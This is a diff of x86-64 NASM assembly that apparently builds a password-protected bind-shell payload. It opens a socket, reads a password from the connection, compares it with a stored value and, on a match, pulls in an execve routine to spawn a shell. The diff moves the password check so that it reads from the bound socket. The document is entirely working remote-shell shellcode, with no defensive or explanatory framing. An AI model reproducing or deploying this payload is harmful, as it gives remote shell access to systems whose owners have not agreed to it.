@@ -8,26 +8,6 @@ _start:
 
 real_start:
 
-    mov rax, 0
-    mov rdi, 0    ; fd
-    sub rsp, 16   ; create space for "buf" in the stack
-    mov rsi, rsp  ; rsi = *buf
-    mov rdx, 16
-    syscall
-
-    ; compare password
-    xor rcx, rcx
-    mov cl, [rel pass_len]
-    lea rdi, [rel password]
-    cld
-    repz cmpsb
-    jne exit
-
-exit:
-    mov rax, 60
-    syscall
-
-
     ; sock = socket(AF_INET, SOCK_STREAM, 0)
     ; AF_INET = 2
     ; SOCK_STREAM = 1
@@ -111,4 +91,24 @@ exit:
     inc rsi
     syscall
 
+check_password:
+    mov rax, 0
+    ; rdi = fd (bound socket)
+    sub rsp, 16   ; create space for "buf" in the stack
+    mov rsi, rsp  ; rsi = *buf
+    mov rdx, 16
+    syscall
+
+    ; compare password
+    xor rcx, rcx
+    mov cl, [rel pass_len]
+    lea rdi, [rel password]
+    cld
+    repz cmpsb
+    jne exit
+
     %include "execve-stack.nasm"
+
+exit:
+    mov rax, 60
+    syscall
